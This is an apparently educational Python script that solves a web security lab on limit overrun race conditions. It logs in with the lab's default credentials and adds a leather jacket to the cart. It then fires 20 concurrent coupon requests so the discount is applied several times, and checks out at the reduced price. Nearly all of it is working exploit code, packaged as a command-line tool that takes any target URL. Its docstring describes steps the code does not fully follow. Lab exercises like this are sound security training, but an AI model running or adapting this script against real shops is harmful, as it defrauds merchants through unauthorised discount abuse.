"""
Lab: Limit overrun race conditions

This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.
To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.
You can log in to your account with the following credentials: wiener:peter.
For a faster and more convenient way to trigger the race condition, we recommend that you solve this lab using the Trigger race conditions custom action. This is only available in Burp Suite Professional.

Steps:
1. Log in and add the cheapest item to your cart.
2. Apply the discount code using POST /cart/coupon.
3. Send multiple parallel requests to apply the discount code (race condition).
4. Add the target item (leather jacket) to your cart.
5. Repeat the race condition attack if needed until the order total is less than your store credit.
6. Purchase the item to solve the lab.

Author: N00BCYB0T
"""

import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
import threading
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

DISCOUNT_CODE = "PROMO20"
TARGET_ITEM = "1"

def get_csrf(session, url):
    r = session.get(url)
    m = re.search(r'csrf" value="(.+?)"', r.text)
    if not m:
        print(f"{Fore.RED}[-] CSRF token not found{Fore.RESET}")
        exit(1)
    return m.group(1)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--user', default='wiener', help='Username')
    parser.add_argument('--passw', default='peter', help='Password')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    url = args.url.rstrip('/')
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}[*] Logging in...{Fore.RESET}")
    csrf_token = get_csrf(session, f"{url}/login")
    login_data = {
        "username": args.user,
        "password": args.passw,
        "csrf": csrf_token
    }
    r = session.post(f"{url}/login", data=login_data)
    if "Your username is: " + args.user not in r.text:
        print(f"{Fore.RED}[-] Login failed{Fore.RESET}")
        return
    print(f"{Fore.GREEN}[+] Logged in as {args.user}{Fore.RESET}")

    

    print(f"{Fore.YELLOW}[*] Adding target item to cart...{Fore.RESET}")
    add_data = {
        "productId": TARGET_ITEM,
        "quantity": "1",
        "redir": "PRODUCT"
    }
    r = session.post(f"{url}/cart", data=add_data)
    print(f"{Fore.GREEN}[+] Added {TARGET_ITEM} to cart{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Applying discount code in parallel...{Fore.RESET}")
    # Prepare all CSRF tokens before starting threads to maximize parallelism
    csrf_tokens = [get_csrf(session, f"{url}/cart") for _ in range(20)]
    def apply_coupon(csrf):
        data = {
            "coupon": DISCOUNT_CODE,
            "csrf": csrf
        }
        session.post(f"{url}/cart/coupon", data=data)
    threads = []
    for csrf in csrf_tokens:
        t = threading.Thread(target=apply_coupon, args=(csrf,))
        threads.append(t)
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(f"{Fore.GREEN}[+] Race condition triggered!{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Checking cart total...{Fore.RESET}")
    r = session.get(f"{url}/cart")
    total_match = re.search(r'<th>Total:</th>\s*<th>\$(\d+\.\d+)</th>', r.text)
    if total_match:
        total = float(total_match.group(1))
        print(f"{Fore.GREEN}[+] Cart total: ${total}{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Could not find cart total{Fore.RESET}")
        return

    print(f"{Fore.YELLOW}[*] Attempting to purchase...{Fore.RESET}")
    csrf_token = get_csrf(session, f"{url}/my-account")
    purchase_data = {
        "csrf": csrf_token
    }
    r = session.post(f"{url}/cart/checkout", data=purchase_data)
    if "Congratulations, you solved the lab!" in r.text:
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Purchase failed or lab not solved. Try repeating the race condition attack.{Fore.RESET}")

if __name__ == "__main__":
    main()
